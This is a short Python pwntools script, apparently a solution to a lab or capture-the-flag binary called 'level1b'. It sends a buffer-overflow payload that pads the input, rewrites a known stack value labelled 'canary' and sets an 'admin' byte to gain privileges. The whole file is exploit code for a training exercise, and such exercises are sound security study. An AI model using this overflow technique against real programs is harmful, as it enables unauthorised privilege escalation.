from pwn import *

from struct import pack

padding = b"A"*8
canary = pack("<I", 0xdeadbeef)
admin = b"\x01"
level1b = process("../release/level1b")

print("[*] recived {}".format(level1b.recvline().strip()))
level1b.sendline(padding + canary + admin)
print("[*] recived {}".format(level1b.recvline()))
